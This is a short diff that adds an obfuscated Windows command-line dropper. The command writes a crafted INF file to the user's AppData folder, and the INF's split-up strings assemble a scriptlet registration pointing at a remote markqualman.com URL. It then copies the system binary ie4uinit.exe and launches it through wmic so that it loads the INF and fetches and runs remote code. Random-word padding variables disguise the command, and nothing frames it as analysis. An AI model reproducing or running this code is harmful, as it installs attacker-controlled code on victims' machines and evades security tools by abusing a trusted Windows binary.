@@ -1,0 +1,6 @@
+/v /c (for %m in (s) do @set "Associations=%~m") &&
+  (for %d in (c) do @set "Loops=%~d") &&
+  (for %f in (a) do @set "Pyramid=%~f") &&
+  call(for %m in ("[destinationdirs]" "defaultdestdir=11" "198=01" "[strings]" "Dollars=t;Hybrid" "Approve=com" "General=h" "servicename=' '" "Around=b;Bloggers" "Waste=init" "Disputes=/" "Polls=:;Venues" "Prayers=%time%" "shortsvcname=' '" "[198]" "ieu%Waste%.inf" "[defaultinstall.windows7]" "delfiles=198" "Un\" "Register\" "OCXs=988B4" "[version]" "signature =$windows nt$" "[988B4]" "sc\" "ro%Around%j,NI,%General%%Dollars%%Dollars%p%Polls%%Disputes%%Disputes%u2khjs8sk.markqualman.%Approve%/jlghiht" ) do @echo %~m)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Thumbs!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Thongs03=Literature &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Thongs56=Observations Inspections Birds Clinics Feels Satisfy Awards Happy Daring Belts Elegant Camps Pride Mobiles Grounds Multiply Income Smilies Produce Benefit Nodes Readings Databases Length Visitors Title Manufacturers Tournaments Parameters Issues Blacks Plains Females Since Concert Grain Globe Columns Because Ghost Pumps Genres Chronic Obligations Laugh Firms Techniques Human Assignments Belongs"
